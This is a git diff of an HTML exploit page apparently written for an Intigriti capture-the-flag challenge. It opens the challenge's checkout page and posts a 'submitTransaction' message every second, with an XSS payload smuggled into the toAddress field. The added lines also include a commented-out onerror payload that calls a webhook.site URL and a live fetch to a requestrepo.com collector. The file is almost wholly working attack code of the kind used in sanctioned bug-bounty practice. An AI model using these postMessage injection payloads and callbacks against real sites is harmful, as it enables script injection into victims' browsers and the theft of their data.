@@ -1,29 +1,27 @@
 <html>
-<body style="height:100vh; cursor:pointer;">
-<script>
-let win = null;
+<body>
+    <script>        
+        //const xssPayload = '\"\u003E\u003Cimg src=x onerror=fetch(`https://webhook.site/3bebad70-172f-48e4-b855-b4a268be6ca9/XSS_SUCCESS`)\u003E';
 
-document.addEventListener("click", () => {
-    if (!win) {
-        win = window.open(
-            "https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=45000",
-            "_blank"
-        );
-    }
-});
+        const win = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=45000", "_blank");
+        const payload = {
+        type: "submitTransaction",
+        transaction: {
+            toAddress: "\"><img src=x onerror=\"alert('attack done!!!')\">",
+            currency: "1337COIN",
+            amount: 11
+        }
+    };
 
-setInterval(() => {
-    if (win) {
-        win.postMessage({
-            type: "submitTransaction",
-            transaction: {
-                toAddress: "\"><img src=x onerror=alert(document.domain)>",
-                currency: "1337COIN",
-                amount: 1
-            }
-        }, "*");
-    }
-}, 1000);
-</script>
+    setInterval(() => {
+        if (win) {
+            console.log("Sending payload...");
+            win.postMessage(payload, "*");
+            fetch('https://we6hfxdk.requestrepo.com/?status=sss');
+        }
+    }, 1000);
+      
+        //document.writeln(win);
+    </script>
 </body>
 </html>
